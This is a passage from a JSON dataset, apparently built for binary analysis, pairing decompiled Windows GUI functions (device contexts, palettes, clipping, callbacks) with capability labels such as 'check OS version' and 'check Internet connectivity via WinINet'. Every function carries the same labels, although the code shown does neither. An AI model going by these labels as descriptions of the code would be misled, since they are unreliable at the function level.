        "decompiled_code": "\nvoid fcn.0045d63c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x45d64c;\n    var_8h = fcn.00419980();\n    uStack24 = 0x45d6da;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x45d677;\n            var_ch = fcn.00419610();\n            puStack32 = 0x45d682;\n            cVar1 = fcn.004289f8();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x45d6b2;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0045d7bc();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x45d6b9;\n                uStack36 = 0x45d6b1;\n                fcn.00428a54();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45d6e1;\n    uStack24 = 0x45d6d9;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 463
    },
    "0045d714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d714(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x45d72d;\n        fcn.00428be4();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x45d745;\n            iVar1 = fcn.00419980();\n            uStack20 = 0x45d799;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0045d580();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.004194b8();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x45d7a0;\n            uStack20 = 0x45d798;\n            fcn.004199e4();\n            return;\n        }\n        puStack16 = 0x45d7ae;\n        fcn.00428be8();\n        puStack16 = 0x45d7b6;\n        fcn.0045d808();\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "0045d7bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d7bc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.00428be8();\n        fcn.00419994();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0045d974": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045d974(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0045d974::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x45da41;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x45d9a9;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x45d9bb;\n        cVar1 = fcn.0040483c();\n        if ((((cVar1 != '\\0') && (*(**0x4a4f48 + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0045d974::var_8h;\n            fcn.00453968();\n            fcn.0040ae94(arg_8h);\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x45da48;\n    iStack56 = 0x45da38;\n    fcn.0040546c();\n    iStack56 = 0x45da40;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 481
    },
    "0045ddac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0045ddac(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x45de9c;\n    iVar1 = fcn.00427974();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x45eff4;\n    *(in_EAX + 0x61) = *0x45dea0;\n    iVar1 = fcn.0045d834();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x45ffb8;\n    iVar1 = fcn.0046c35c();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x461a90;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x470dac;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 584
    },
    "0045dfb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045dfb0(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.0040483c(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x80))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 254
    },
    "0045e1dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045e1dc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.0041fae8();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "0045e6a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e6a4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x45e6e9;\n            fcn.00419754();\n            puStack40 = 0x45e6fa;\n            fcn.0041f984();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x45e71a;\n            fcn.004194b8();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x45e7c4;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.0040483c();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.0040483c();\n                fcn.0041f744();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.0040483c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 535
    },
    "0045e944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045e944(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45e9c5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407480();\n        fcn.0040da34(in_stack_ffffffd4, arg_ch);\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x45e9cc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 395
    },
    "0045eae0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045eae0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x4ab00c == 0)) && (*0x45eb48 == (*0x45eb44 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.004601fc(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0045f070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f070(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0045f10c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f10c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "0045f130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f130(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0045f268": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045f268(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45f2fe;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00407480();\n        fcn.0040da34(uVar2, arg_ch);\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x45f305);\n    return;\n}\n",
        "token_count": 398
    },
    "0045f310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0045f310(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.0041966c();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.00419610();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.0045e864();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 279
    },
    "0045f39c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045f39c(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.00466fb4();\n    if (cVar2 != '\\0') {\n        fcn.0045e864();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.0045f310(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.00466ca8(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "0045f43c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0045f43c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 175
    },
    "0045f484": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f484(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    piVar1 = fcn.00471968();\n    piVar2 = fcn.0045bcf0();\n    if ((((piVar2 != NULL) && (piVar1 != piVar2)) && (in_EAX != piVar2)) && (piVar2[0xc] == 0)) {\n        (**(*piVar2 + 0x78))();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        if ((piVar1 == NULL) || (in_EAX == piVar1)) {\n            arg_8h = *(param_2 + 8);\n            uVar3 = fcn.004601fc(arg_8h);\n            *(arg_8h + 0xc) = uVar3;\n        }\n        else {\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0045f518": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045f518(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x45f55d;\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x45f57d;\n                uStack20 = fcn.00466ca8();\n                puStack24 = 0x45f583;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x45f5f1;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00464598();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.00466ca8(uVar2, 0x45f60e);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x45f603;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x45f60e;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 510
    },
    "0045f618": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045f618(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "0045f648": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045f648(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0045f77c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f77c(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0045f7b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f7b8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0045f804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f804(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0045f91c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f91c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0045f99c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.0045f99c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.0040483c();\n            }\n            else {\n                var_ah = fcn.0040483c();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 428
    },
    "0045fb08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
